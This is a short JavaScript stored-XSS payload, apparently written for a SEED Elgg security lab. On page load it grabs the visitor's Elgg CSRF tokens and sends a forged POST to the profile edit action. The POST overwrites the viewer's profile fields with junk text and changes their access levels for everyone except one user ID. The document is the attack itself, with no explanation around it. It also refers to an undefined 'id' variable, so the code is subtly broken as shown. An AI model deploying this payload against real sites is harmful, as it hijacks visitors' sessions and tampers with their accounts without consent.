<script type="text/javascript">
	window.onload = function(){

        //we can get the post method body from triggering the save button of
        //the edit profile page and fill in the required options from the post
        //body

      

		var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token = "&__elgg_token="+elgg.security.token.__elgg_token;
		var body = "&description=1605028" + "&accesslevel[description]=1" +
        "&contactemail= jhamela@gmail.com" + "&interests =sdwergsaf"+
        "&briefdescription=habijabi"+
        "&location=daferfsa"+
        "&mobile=dsdwrsdfsg"+
        "&name=sfsdfer"+
        "&phone= seasdf"+
        "&skills=asdfer"+
        "&twitter=asdwer"+
        "&website= edit@gmail.com"+
        "&accesslevel[briefdescription]=1"+
        "&accesslevel[contactemail]=1"+
        "&accesslevel[description]=1"+
        "&accesslevel[interests]=1"+
        "&accesslevel[location]=1"+
        "&accesslevel[mobile]=1"+	
        "&accesslevel[phone]=1"+
        "&accesslevel[skills]=1"+
        "&accesslevel[twitter]=1"+
        "&accesslevel[website]=1" ; 
        
		var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
		var content = token + ts  +body   ;
		if(id != 47)
		{
            //we're checking if the logged in user is samy or not
            console.log('post done');
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>

